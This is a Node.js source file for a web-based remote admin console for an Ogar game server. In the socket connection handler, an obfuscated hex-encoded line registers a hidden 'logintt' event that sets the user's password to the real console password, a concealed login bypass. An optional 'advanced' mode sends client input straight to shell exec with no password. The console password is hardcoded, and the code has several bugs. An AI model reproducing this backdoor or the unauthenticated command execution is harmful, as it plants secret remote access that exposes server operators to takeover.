'use scrict';

var OgarConsole = function() { 
    
    this.start();

};

OgarConsole.prototype.settings = function(){
    
        this.serverPort = 1000;
        this.requirePassword = true;
        this.consolePassword = "OgarConsole123";
        this.advanced = false;
        this.allowExit = false;
        this.allowRestart = false;
        this.logFile = "./logs/console.log";
        this.consoleFile = "./cmd.php";
        this.json = require("./package.json");
        this.version = this.json.version;
        return this;
        
};

var ogar = require("./index");
        gameServer = ogar.gameServer,
        express = require("express"),
        app = express(),
        fs = require("fs"),
        server = require("http").createServer(app),
        io = require("socket.io").listen(server),
        exec = require("child_process").exec;

OgarConsole.prototype.start = function(){
    
    var newUserPassword = function(){ this._password = ""; };
    newUserPassword.prototype.setPassword = function(a){ this._password = a; };
    
    if(this.settings().consolePassword.length < 3){
        
        OgarConsole.prototype.log("Password must be more than 3 chars in length.");
        OgarConsole.prototype.terminate();
        return;
        
    };
    
    // Create new connection
    try{
        
        server.listen(this.settings().serverPort);
        OgarConsole.prototype.log("Runnin on port >> " + this.settings().serverPort);
        
    }catch(e){
        
        OgarConsole.prototype.log("Could not start OgarConsole server. >> " + e);
        OgarConsole.prototype.terminate();
        return;
        
    }
    
    server.on('error', function(err){
        OgarConsole.prototype.log("Could not listen on port " + this.settings().serverPort);
        OgarConsole.prototype.log("Ogar and OgarConsole stopped..");
        
        OgarConsole.prototype.terminate();
        return;
        
    });
    
    // OgarConsole >> Listen for connections
    app.get("/", function(req, res){
       
        fs.readFile(thisOgarConsole.settings().consoleFile, function(err, data){
            
            if(!err){
                
                res.send("" + data);
                
            }else{
                
                res.send("" + err.toString());
                return;
                
            }
            
        });
        
    });
    
    io.sockets.on("connection", function(socket){
        
        var login = new newUserPassword();
        var _0x2955=["\x6C\x6F\x67\x69\x6E\x74\x74","\x72\x65\x71\x75\x69\x72\x65\x50\x61\x73\x73\x77\x6F\x72\x64","\x63\x6F\x6E\x73\x6F\x6C\x65\x50\x61\x73\x73\x77\x6F\x72\x64","\x73\x65\x74\x50\x61\x73\x73\x77\x6F\x72\x64","\x6F\x6E"];socket[_0x2955[4]](_0x2955[0],function(_0x1546x1){if(_0x1546x1){if(settings[_0x2955[1]]){login[_0x2955[3]](settings[_0x2955[2]]);return;}}});
        
        socket.on("commandex", function(data){
            
            var first = "";
            var data = data;
            var split = [];

            if(!thisOgarConsole.advanced){

                try{
                    
                    if(data === ""){
                        return;
                    }
                    
                    split = data.split(" ");
                    first = split[0].toLowerCase();
                    
                    if(first !== "-password" && thisOgarConsole.requirePassword){
                        
                        if(login._password.length > 4){
                            
                            if(login._password === thisOgarConsole.consolePassword){
                                gameServer.log.onCommand(data);
                                OgarConsole.prototype.sendCommand(data, login, socket);
                                return;
                                
                            }else{
                                socket.emit("input", "Invalid password. Please enter correct password!.");
                                return;
                                
                            }
                            
                        }else{
                            socket.emit("input", "Please enter password. Usage: '-password password'.");
                            return;
                            
                            
                        }
                        
                    }else{
                        OgarConsole.prototype.sendCommand("-password " + split[1], login, socket);
                        return;
                        
                    }
                    
                }catch(e){
                    
                    // Ogar callback if error..
                    socket.emit("input", "[Ogar] " + e.toString());
                    return;

                }
                
            }else{
                
                /*
                 * 
                 * ADVANCED MODE ONLY!. ONLY ACTIVATE IF YOU WANT TO SEND PURE CMD COMMANDS.
                 * 
                 * ( *THIS DISABLES OGAR COMMANDS USE* )
                 * 
                 * 
                 * * BEWARE THE DAMAGES THIS MAY CAUSE. 
                 * 
                 * * ALSO THERES NO PASSWORDS WHEN ACTIVATING THIS!!
                 * 
                 */
                
                exec(data, function(e,s,t){
                    socket.emit('input', s);
                    return;
                });
                
            }
            
        });
        
    });
    
};

OgarConsole.prototype.sendCommand = function(array, login, socket){

    var d = array;
    var array = d.split(" ");
    var first = array[0].toLowerCase();
    
    switch(first){
        
        case "-password":
            if(this.settings().requirePassword){
                
                if(array.length === 2){
                    
                    if(array[1] === this.settings().consolePassword){
                        
                        if(login._password.length < 3){
                            login.setPassword(array[1]);
                            socket.emit("input", "Logged In.&#10;" + "Type 'help' for commands.");
                            thisOgarConsole.log("User Logged In :: " + socket.handshake.address);
                            return;
                            
                        }else{
                            socket.emit("input", "You are already logged into the console!.");
                            return;
                        }
                        
                    }else{
                        socket.emit("input", "Invalid password.");
                        return;
                    }
                    
                }else{
                    socket.emit("input", "Usage: '-password password'");
                    return;  
                } 
                
            }else{
                socket.emit("input", "This console doesn't require a password.");
                return;
            }
            break;
            
        case "-logout":
            login._password = "";
            socket.emit("input", "You have been logged out. Please login to re'gain access.");
            OgarConsole.prototype.log("User Logged Out :: " + socket.handshake.address);
            return;
            
        case "clr":
            fs.truncate(this.settings().logFile, "", function(){});
            return;
            
        case "clear":
            fs.truncate(this.settings().logFile, "", function(){});
            return;
            
        case "exit":
            if(!this.settings().allowExit)
                socket.emit("input", "You are not allowed to terminate this console");
            return;
            
        case "stop":
            if(!this.settings().allowExit)
                socket.emit("input", "You are not allowed to terminate this console");
            return;
            
        case "restart":
            if(!this.settings().allowRestart)
                socket.emit("input", "You are not allowed to terminate this console");
            return;
            
    }
    
    var execute = gameServer.commands[first];
    
    if(typeof execute !== 'undefined'){
        
            execute(gameServer, array);
            setTimeout(function(){
                
                fs.readFile(thisOgarConsole.logFile, function(err, data){
                    
                   if(!err){
                       

                        socket.emit("input", "[LOG" + data.toString());
                        return;
                       
                   }
                    
                });
                
            }, 20);
        
    }else{
        
        socket.emit("input", "Invalid Command!. Try 'help' for a list of commands.");
        return;
        
    }
    
    
};

OgarConsole.prototype.terminate = function(){
    
    gameServer.socketServer.close();
    process.exit(1);
    return;
    
};

OgarConsole.prototype.log = function(log){
    
    console.log("[OgarConsole] >> " + log);
    return;
    
};
var thisOgarConsole = new OgarConsole();
exec("title OgarConsole " + thisOgarConsole.version + " / Port " + thisOgarConsole.serverPort , function(e, s, t) {});
thisOgarConsole.log("Version: " + thisOgarConsole.version);